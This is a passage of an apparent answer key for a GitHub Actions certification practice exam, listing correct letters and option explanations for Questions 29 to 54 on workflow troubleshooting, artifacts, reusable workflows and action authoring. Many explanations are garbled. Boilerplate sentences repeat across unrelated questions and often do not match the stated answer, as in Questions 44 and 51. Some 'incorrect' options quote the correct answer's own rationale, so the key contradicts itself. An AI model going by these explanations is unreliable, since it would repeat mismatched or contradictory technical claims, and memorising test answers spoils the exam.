- **C:** Correct. Step debug (`::debug::`) and runner debug logs isolate workflow logic errors from runner OOM (`137`) or command-not-found (`127`) failures.
- **D:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!

### Question 29 — `D, F` (Consume and troubleshoot workflows)

Correct answers: D and F (are correct). Expand the automatic `Set up job` step at the top of the job log (`which lists every exact permission granted to GITHUB_TOKEN for that job`), and re-run the failed job with `Enable debug logging` to inspect the HTTP request endpoint and response headers. [Skill 2.2: Enable and interpret step and runner diagnostic logs to identify failures | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/enabling-debug-logging)]

- **A:** Incorrect. Pushing a `schedule:` workflow solely to a feature branch (`feat/nightly`) never triggers cron runs until merged into the default branch (`main`).
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Correct. Selective failed-job reruns with debug logging capture verbose step and runner diagnostics without re-running passing matrix combinations.
- **E:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **F:** Correct. Step debug (`::debug::`) and runner debug logs isolate workflow logic errors from runner OOM (`137`) or command-not-found (`127`) failures.

### Question 30 — `C` (Consume and troubleshoot workflows)

Correct answer: C (is correct). Dereferencing `*codec_matrix` copies the anchored mapping verbatim into job 2, spawning `3` matrix jobs (`h264`, `hevc`, `av1`) with `fail-fast: false`. [Skill 2.3: Interpret workflows that use YAML anchors and aliases during execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/reference/workflows-and-actions/reusing-workflow-configurations#yaml-anchors-and-aliases)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Incorrect. Each job executes on a fresh isolated runner environment, so cross-job transfer requires declared `jobs.<id>.outputs` strings or uploaded workflow artifacts.
- **C:** Correct. When expanding `<<: *defaults` in a YAML mapping, keys explicitly written in the child mapping take precedence over keys inherited from `*defaults`.
- **D:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!

### Question 31 — `D` (Consume and troubleshoot workflows)

Correct answer: D (is correct). No — scalar/node anchors (`&default_timeout 20`) are immutable definitions expanded at parse time; setting `120` directly on `jobs.soak` affects only `jobs.soak` while every `*default_timeout` alias expands to `20`. [Skill 2.3: Interpret workflows that use YAML anchors and aliases during execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/reference/workflows-and-actions/reusing-workflow-configurations#yaml-anchors-and-aliases)]

- **A:** Incorrect. Reusable workflows execute under the caller repository `GITHUB_TOKEN`/context, support up to 4 nesting levels, and accept explicit `with:` inputs and `secrets:`.
- **B:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **C:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **D:** Correct. When expanding `<<: *defaults` in a YAML mapping, keys explicitly written in the child mapping take precedence over keys inherited from `*defaults`.

### Question 32 — `A` (Consume and troubleshoot workflows)

Correct answer: A (is correct). Mapping the failed run-graph node to `(ubuntu-24.04-arm, av1, 10bit)`, inspecting step logs for the first non-zero exit / `::error::`, running `Re-run failed jobs` with `Enable debug logging`, and verifying the committed fix resolves the issue efficiently. [Skill 2.4: Analyze matrix-driven runs and re-run failed or targeted jobs | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/re-running-workflows-and-jobs)]

- **A:** Correct. Selective `Re-run failed jobs` with `Enable debug logging` (`ACTIONS_STEP_DEBUG` / `ACTIONS_RUNNER_DEBUG`) isolates failures without re-billing green legs.
- **B:** Incorrect. Deleting workflows erases run history, printing secrets violates security rules, and re-running green matrix legs wastes billable minutes.
- **C:** Incorrect. Suppressing exit codes with `|| true` hides real regressions rather than diagnosing the failing matrix variant.
- **D:** Incorrect. Standard GitHub-hosted runners do not expose inbound port 22 SSH, and permanent org-wide debug logging bloats log storage.

### Question 33 — `B` (Consume and troubleshoot workflows)

Correct answer: B (is correct). Passing `--job <job-id>` (`gh run rerun <run-id> --job <job-id> --debug`, backed by `POST /repos/{owner}/{repo}/actions/jobs/{job_id}/rerun`) re-executes a single targeted job (`plus its downstream dependents`) even when the run previously succeeded. [Skill 2.4: Analyze matrix-driven runs and re-run failed or targeted jobs | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/re-running-workflows-and-jobs)]

- **A:** Incorrect. Unlike legacy v3, `upload-artifact@v4` finalizes artifacts immediately and forbids appending/overwriting the same artifact name across parallel matrix jobs.
- **B:** Correct. GitHub Actions supports re-running all jobs, **only failed jobs** (and their downstream dependents), or **one specific job** up to 30 days after initial run creation.
- **C:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **D:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.

### Question 34 — `B` (Consume and troubleshoot workflows)

Correct answer: B (is correct). Yes — GitHub's Actions Workflows REST endpoints accept EITHER the numeric `workflow_id` OR the workflow file name string (`encode.yml`) in `{workflow_id}`. [Skill 2.5: Locate workflow runs and logs via the GitHub UI, CLI, and REST API | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/rest/actions/workflow-runs)]

- **A:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **B:** Correct. Both the GitHub CLI (`gh run`) and Actions Workflow Runs REST API expose run metadata, timing, check suites, and downloadable log archives.
- **C:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **D:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.

### Question 35 — `B, E` (Consume and troubleshoot workflows)

Correct answers: B and E (are correct). `gh workflow view drm-ci.yml --yaml` (`and gh workflow run drm-ci.yml --ref main`) inspects/triggers the workflow YAML, while `gh run view <run-id> --log-failed` (`or gh run watch <run-id>`) streams failed/live step logs directly in the terminal. [Skill 2.5: Locate workflow runs and logs via the GitHub UI, CLI, and REST API | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/rest/actions/workflow-runs)]

- **A:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **B:** Correct. In `upload-artifact@v4`, artifacts are immutable once uploaded—matrix jobs must include `${{ matrix.* }}` in `name:` and merge via `pattern:` on download.
- **C:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **D:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **E:** Correct. Both the GitHub CLI (`gh run`) and Actions Workflow Runs REST API expose run metadata, timing, check suites, and downloadable log archives.
- **F:** Incorrect. Pushing a `schedule:` workflow solely to a feature branch (`feat/nightly`) never triggers cron runs until merged into the default branch (`main`).

### Question 36 — `B` (Consume and troubleshoot workflows)

Correct answer: B (is correct). Setting `compression-level: 0` (`range 0..9, default 6`) on `actions/upload-artifact@v4` stores pre-compressed binaries (`mp4`, `whl`, `tar.zst`) with zero CPU compression overhead for maximum upload speed. [Skill 2.6: Access and download workflow artifacts from completed runs | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/downloading-workflow-artifacts)]

- **A:** Incorrect. Unlike legacy v3, `upload-artifact@v4` finalizes artifacts immediately and forbids appending/overwriting the same artifact name across parallel matrix jobs.
- **B:** Correct. In `upload-artifact@v4`, artifacts are immutable once uploaded—matrix jobs must include `${{ matrix.* }}` in `name:` and merge via `pattern:` on download.
- **C:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **D:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.

### Question 37 — `C` (Consume and troubleshoot workflows)

Correct answer: C (is correct). No — `actions/upload-artifact@v4` artifacts are immutable once uploaded and reject duplicate names within a run; upload `latency-csv-${{ matrix.region }}` per leg and download all 6 together via `actions/download-artifact@v4` (`pattern: latency-csv-*`, `merge-multiple: true`). [Skill 2.6: Access and download workflow artifacts from completed runs | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/downloading-workflow-artifacts)]

- **A:** Incorrect. Because `upload-artifact@v4` artifacts are immutable once uploaded, matrix legs upload distinct artifact names and fan-in jobs merge them via `pattern:`.
- **B:** Incorrect. In `upload-artifact@v4`, artifacts are immutable once uploaded—matrix jobs must include `${{ matrix.* }}` in `name:` and merge via `pattern:` on download.
- **C:** Correct. Unlike legacy v3, `upload-artifact@v4` finalizes artifacts immediately and forbids appending/overwriting the same artifact name across parallel matrix jobs.
- **D:** Incorrect. The proposed workflow or action configuration violates at least one stated GitHub Actions execution, security, or governance rule. No — `actions/upload-artifact@v4` artifacts are immutable once uploaded and reject duplicate names within a run; upload `latency-csv-${{ matrix.region }}` per leg and download all 6 together via `actions/download-artifact@v4` (`pattern: latency-csv-*`, `merge-multiple: true`).

### Question 38 — `C` (Consume and troubleshoot workflows)

Correct answer: C (is correct). No — unlike `GITHUB_TOKEN`, custom repository/organization secrets are NEVER passed implicitly into a `workflow_call` workflow; the caller must explicitly pass mapped `secrets:` or declare `secrets: inherit` (`within the same org/enterprise`). [Skill 2.7: Consume organization-level reusable workflows in downstream repositories | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/reusing-workflows)]

- **A:** Incorrect. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Correct. Reusable workflows execute under the caller repository `GITHUB_TOKEN`/context, support up to 4 nesting levels, and accept explicit `with:` inputs and `secrets:`.
- **D:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!

### Question 39 — `A` (Consume and troubleshoot workflows)

Correct answer: A (is correct). Yes — referencing a local reusable workflow via `uses: ./.github/workflows/reusable-test.yml` (`with NO @ref suffix`) executes the reusable workflow version from the exact same caller commit (`GITHUB_SHA`), ideal for testing reusable-workflow PR changes atomically. [Skill 2.7: Consume organization-level reusable workflows in downstream repositories | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/reusing-workflows)]

- **A:** Correct. Reusable workflows execute under the caller repository `GITHUB_TOKEN`/context, support up to 4 nesting levels, and accept explicit `with:` inputs and `secrets:`.
- **B:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **C:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **D:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.

### Question 40 — `C` (Consume and troubleshoot workflows)

Correct answer: C (is correct). No — editing a starter workflow template affects ONLY new workflows created via `Actions -> New workflow` in the future; enforcing a check across 80 existing repos without per-repo edits requires a Repository Ruleset Required Workflow (`or an existing workflow_call reusable workflow`). [Skill 2.8: Use public and non-public starter workflow templates across repositories | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-workflow-templates)]

- **A:** Incorrect. The proposed workflow or action configuration violates at least one stated GitHub Actions execution, security, or governance rule. No — editing a starter workflow template affects ONLY new workflows created via `Actions -> New workflow` in the future; enforcing a check across 80 existing repos without per-repo edits requires a Repository Ruleset Required Workflow (`or an existing workflow_call reusable workflow`).
- **B:** Incorrect. Reusable workflows execute under the caller repository `GITHUB_TOKEN`/context, support up to 4 nesting levels, and accept explicit `with:` inputs and `secrets:`.
- **C:** Correct. Starter templates only scaffold initial file creation; centrally updating CI logic across 100 repos requires a Reusable Workflow (`on: workflow_call`) or Required Workflow.
- **D:** Incorrect. Starter workflows copy a static `.yml` into a repo once (`edits to the template never propagate`), unlike centrally versioned Reusable workflows or Composite actions.

### Question 41 — `A, E` (Consume and troubleshoot workflows)

Correct answers: A and E (are correct). Organization starter templates stored in a `Public` `<org>/.github` repository are available on all plans, whereas hosting non-public (`Internal` or `Private`) `<org>/.github` starter workflow templates for private repositories requires **GitHub Enterprise** (`Cloud or Server`). [Skill 2.8: Use public and non-public starter workflow templates across repositories | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-workflow-templates)]

- **A:** Correct. Starter templates bootstrap new repos as independent copies, whereas `workflow_call` reusable workflows centralize ongoing maintenance in one versioned file.
- **B:** Incorrect. Starter templates only scaffold initial file creation; centrally updating CI logic across 100 repos requires a Reusable Workflow (`on: workflow_call`) or Required Workflow.
- **C:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **D:** Incorrect. Composite actions fail schema validation if any `run:` step omits `shell:`, unlike normal workflow jobs which provide a default OS shell.
- **E:** Correct. Starter workflows copy a static `.yml` into a repo once (`edits to the template never propagate`), unlike centrally versioned Reusable workflows or Composite actions.
- **F:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.

### Question 42 — `A` (Consume and troubleshoot workflows)

Correct answer: A (is correct). Yes — deleting a workflow `.yml` file from `main` stops `schedule` (`default-branch`) triggers and runs on `main`, but pushes to `archive/v1` (`where .github/workflows/retired-hls-v1.yml still exists`) can still trigger `on: push` unless the workflow is disabled (`gh workflow disable`) or removed from that branch. [Skill 2.9: Manage workflow lifecycle states including disabling, enabling, and deleting workflows | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/disabling-and-enabling-a-workflow)]

- **A:** Correct. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **B:** Incorrect. Pushing a `schedule:` workflow solely to a feature branch (`feat/nightly`) never triggers cron runs until merged into the default branch (`main`).
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!

### Question 43 — `B` (Consume and troubleshoot workflows)

Correct answer: B (is correct). Running `gh workflow list --all` (`-a`) displays active as well as manually or inactivity-disabled workflows alongside their workflow IDs (`for gh workflow enable <id>`). [Skill 2.9: Manage workflow lifecycle states including disabling, enabling, and deleting workflows | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/disabling-and-enabling-a-workflow)]

- **A:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **B:** Correct. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **C:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **D:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.

### Question 44 — `C` (Author and maintain actions)

Correct answer: C (is correct). Run `npm run bundle` (`e.g., ncc build src/index.ts -o dist`) in CI followed by `git diff --ignore-space-at-eol --exit-code dist/` so any PR with stale unbundled `dist/` fails immediately. [Skill 3.1: Create and configure JavaScript actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-javascript-action)]

- **A:** Incorrect. Composite actions fail schema validation if any `run:` step omits `shell:`, unlike normal workflow jobs which provide a default OS shell.
- **B:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **C:** Correct. JavaScript actions run directly on Linux, Windows, and macOS host runners with sub-second startup (`no Docker image pull/build overhead`) and support `pre:`/`post:` cleanup.
- **D:** Incorrect. Jobs running on `macos-latest` or `windows-latest` fail if a step invokes a `runs.using: "docker"` action; use `node20` JavaScript or `composite` actions for multi-OS support.

### Question 45 — `A` (Author and maintain actions)

Correct answer: A (is correct). The official `@actions/io` package (`io.which('ffprobe', true)`, `io.mkdirP()`, `io.cp()`, `io.rmRF()`) provides cross-platform filesystem and PATH utilities for JavaScript actions. [Skill 3.1: Create and configure JavaScript actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-javascript-action)]

- **A:** Correct. JavaScript actions run directly on Linux, Windows, and macOS host runners with sub-second startup (`no Docker image pull/build overhead`) and support `pre:`/`post:` cleanup.
- **B:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.

### Question 46 — `D` (Author and maintain actions)

Correct answer: D (is correct). Authoring `action.yml` (`using: "node20"`, `main: "dist/index.js"`), coding with `@actions/core` & `core.setFailed()`, bundling `dist/index.js` via `@vercel/ncc` & committing `dist/`, and tagging `v1.0.0` + `v1` + 40-char SHA delivers clean cross-OS releases. [Skill 3.1: Create and configure JavaScript actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-javascript-action)]

- **A:** Incorrect. Docker actions fail on macOS and Windows runners; cross-OS custom actions require JavaScript (`node20`) or Composite actions.
- **B:** Incorrect. Omitting both `dist/` and `node_modules/` crashes immediately with `Cannot find module`, `node12` is retired, and `@main` is unsafe.
- **C:** Incorrect. Bundled `dist/index.js` + `action.yml` runs standalone with zero pre-install steps in caller workflows.
- **D:** Correct. Bundling `node20` JavaScript actions into committed `dist/index.js` gives sub-second cross-OS execution with zero consumer `npm install` step.

### Question 47 — `C` (Author and maintain actions)

Correct answer: C (is correct). No — Docker container actions (`runs.using: 'docker'`) run exclusively on Linux runners and fail on `macos-15` and `windows-2025`; use a `node20` JavaScript action or `composite` action for cross-OS support. [Skill 3.2: Create and configure Docker container and composite actions, and select the appropriate action type | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-docker-container-action)]

- **A:** Incorrect. The proposed workflow or action configuration violates at least one stated GitHub Actions execution, security, or governance rule. No — Docker container actions (`runs.using: 'docker'`) run exclusively on Linux runners and fail on `macos-15` and `windows-2025`; use a `node20` JavaScript action or `composite` action for cross-OS support.
- **B:** Incorrect. JavaScript actions run directly on Linux, Windows, and macOS host runners with sub-second startup (`no Docker image pull/build overhead`) and support `pre:`/`post:` cleanup.
- **C:** Correct. Jobs running on `macos-latest` or `windows-latest` fail if a step invokes a `runs.using: "docker"` action; use `node20` JavaScript or `composite` actions for multi-OS support.
- **D:** Incorrect. Docker actions guarantee exact Linux OS dependencies (`Linux-only, slower image startup`), whereas Composite actions chain cross-OS `run:` (`shell:` required) and `uses:` steps.

### Question 48 — `B` (Author and maintain actions)

Correct answer: B (is correct). Every `run:` step in a `composite` action MUST declare an explicit `shell:` (`such as shell: bash` or `shell: pwsh`, which both work cross-platform when installed). [Skill 3.2: Create and configure Docker container and composite actions, and select the appropriate action type | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-docker-container-action)]

- **A:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **B:** Correct. Docker actions guarantee exact Linux OS dependencies (`Linux-only, slower image startup`), whereas Composite actions chain cross-OS `run:` (`shell:` required) and `uses:` steps.
- **C:** Incorrect. Composite actions fail schema validation if any `run:` step omits `shell:`, unlike normal workflow jobs which provide a default OS shell.
- **D:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.

### Question 49 — `C, F` (Author and maintain actions)

Correct answers: C and F (are correct). In the Actions job log UI, all steps inside a Composite action collapse neatly under the single caller step (`while still supporting ::group:: and $GITHUB_STEP_SUMMARY`), and Composite actions can chain multiple `uses:` actions + `run:` steps (`each with explicit shell:`) inside the caller's existing runner environment. [Skill 3.2: Create and configure Docker container and composite actions, and select the appropriate action type | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-docker-container-action)]

- **A:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **B:** Incorrect. Jobs running on `macos-latest` or `windows-latest` fail if a step invokes a `runs.using: "docker"` action; use `node20` JavaScript or `composite` actions for multi-OS support.
- **C:** Correct. Composite actions require explicit `shell:` on every `run:` step and locate files inside the action repo via `github.action_path`.
- **D:** Incorrect. Composite actions fail schema validation if any `run:` step omits `shell:`, unlike normal workflow jobs which provide a default OS shell.
- **E:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **F:** Correct. Docker actions guarantee exact Linux OS dependencies (`Linux-only, slower image startup`), whereas Composite actions chain cross-OS `run:` (`shell:` required) and `uses:` steps.

### Question 50 — `A` (Author and maintain actions)

Correct answer: A (is correct). Because `v1.3.0` was published as an immutable OCI package in `GHCR`, neither the `v1.3.0` package digest nor its immutable release tag can be overwritten or deleted-and-recreated with malicious code (`especially when consumers also pin by 40-char SHA`). [Skill 3.3: Troubleshoot action failures and adopt immutable action distribution practices | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/about-custom-actions)]

- **A:** Correct. Immutable Actions package releases into immutable OCI artifacts so published versions cannot be silently overwritten, while `core.setFailed()` logs an `::error::` annotation and sets exit code `1`.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Incorrect. Immutable Actions distribute OCI action packages from `ghcr.io` / `pkg.actions.githubusercontent.com`; blocking those hosts breaks action downloads during job setup!
- **D:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.

### Question 51 — `B` (Author and maintain actions)

Correct answer: B (is correct). Either `clearInterval(timer)` in a `finally` block (`or timer.unref()`) rather than calling `process.exit(0)` abruptly, allowing Node 20's event loop to drain naturally after `core.setFailed()` / `core.setOutput()` flush stdout and environment files. [Skill 3.3: Troubleshoot action failures and adopt immutable action distribution practices | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/about-custom-actions)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Correct. Immutable Actions package releases into immutable OCI artifacts so published versions cannot be silently overwritten, while `core.setFailed()` logs an `::error::` annotation and sets exit code `1`.
- **C:** Incorrect. Composite actions fail schema validation if any `run:` step omits `shell:`, unlike normal workflow jobs which provide a default OS shell.
- **D:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.

### Question 52 — `C` (Author and maintain actions)

Correct answer: C (is correct). For JavaScript (`and Docker`) actions, `required: true` in `action.yml` is schema metadata (`flagged by VS Code IntelliSense`), NOT enforced by the runner before process launch — your code MUST call `core.getInput('manifest_path', { required: true })` so `@actions/core` throws an error when empty! [Skill 3.4: Define action metadata, inputs, outputs, and branding in action configuration files | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/metadata-syntax-for-github-actions)]

- **A:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Correct. Every JavaScript, Docker, and Composite custom action requires a valid `action.yml` / `action.yaml` metadata file defining its interface and runtime.
- **D:** Incorrect. Composite actions fail schema validation if any `run:` step omits `shell:`, unlike normal workflow jobs which provide a default OS shell.

### Question 53 — `C` (Author and maintain actions)

Correct answer: C (is correct). `runs.args` in a Docker container `action.yml` defines an array of strings passed as command-line arguments to the container `ENTRYPOINT`. [Skill 3.4: Define action metadata, inputs, outputs, and branding in action configuration files | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/metadata-syntax-for-github-actions)]

- **A:** Incorrect. Marketplace rejects repositories that are `Private`/`Internal`, lack a root `action.yml`, or bundle multiple actions inside one repository.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Correct. Every JavaScript, Docker, and Composite custom action requires a valid `action.yml` / `action.yaml` metadata file defining its interface and runtime.
- **D:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!

### Question 54 — `B, C, E` (Author and maintain actions)

Correct answers: B, C, and E (are correct). Configure `runs: { using: 'node20', main: 'dist/index.js', post: 'dist/cleanup.js' }` with committed `@vercel/ncc` output; validate required inputs via `core.getInput(name, { required: true })`; and report errors via `core.setFailed(err)` + mask credentials via `core.setSecret()`. [Skill 3.4: Define action metadata, inputs, outputs, and branding in action configuration files | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/metadata-syntax-for-github-actions)]

- **A:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **B:** Correct. `@actions/core` safely escapes multiline environment file values, masks secrets via `setSecret()`, and passes state between `pre:` -> `main:` -> `post:` scripts via `saveState`/`getState`.
- **C:** Correct. Bundling dependencies into committed `dist/index.js` makes JavaScript actions self-contained and fast across Linux, Windows, and macOS.
